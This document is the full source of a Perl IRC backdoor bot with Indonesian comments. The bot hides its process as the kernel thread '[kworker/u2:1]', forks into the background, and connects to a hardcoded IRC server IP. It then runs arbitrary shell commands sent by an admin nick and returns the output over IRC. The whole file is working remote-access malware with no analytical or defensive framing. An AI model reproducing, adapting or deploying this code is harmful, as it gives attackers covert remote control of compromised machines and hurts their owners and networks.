#!/usr/bin/perl
use IO::Socket;
$proses = "[kworker/u2:1]";
$acak = int(rand(99999)) + 10000;
$botnick = "ID$acak";
$shellok = $ARGV[0];
$admin = "ijoo";
$server = "108.166.195.138";
$port = "6667";
$basechan = "#itsupport";
$logo = "\00314,1i\0038\037B\037\00314o\0037t\00315z\003";

##### Don't edit below here. #####
$0="$proses"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

&connect;
sub connect(){
 $sock = IO::Socket::INET->new(PeerAddr => $server,
                               PeerPort => $port,
                               Proto => "tcp") or die "Can't connect to $server.\n";
 print $sock "user $botnick $botnick $botnick :$shellok\n";
 print $sock "nick $botnick \n";
 print "LOG: Connect to Server! \n";
}

##### IRC Stuff. #####
while(<$sock>){
 chomp;
 $line   = $_;
 $backup = $line;
 $line   = lc($line);

if($backup =~ m/^PING :(.*?)$/gi) {
   print $sock "PONG $1 \r\n";
}

if($line=~/376/){
   print $sock "JOIN $basechan \r\n";
 }

if($line=~/^error :closing link:/){
  print "LOG: Connection has been closed, trying to reconnect!...\n";
  &connect;
 }

if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :$shellok# (.*).$/){
   my $cmdny = $4;
   my @outputny=`$cmdny 2>&1 3>&1`;
   my $l=0;
   foreach my $baris (@outputny) {
        $l++;
        chop $a;
        if ($3 eq $botnick) {
           print $sock "PRIVMSG $admin :$baris \n";
        } else {
           print $sock "PRIVMSG $3 :$baris \n";
        }
        if ($l == "4") {
        $l=0;
        sleep 3;
        }
    }
}

if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.join (.*).$/){
   my $joinny = $4;
   print $sock "JOIN $joinny \n";
}

if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.part (.*).$/){
   my $partny = $4;
   print $sock "PART $partny \n";
}

if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.raw (.*).$/){
   my $rawny = $4;
   print $sock "$rawny\n";
   print $sock "PRIVMSG $admin :Jalankan Perintah: $rawny \n";
}

} #end
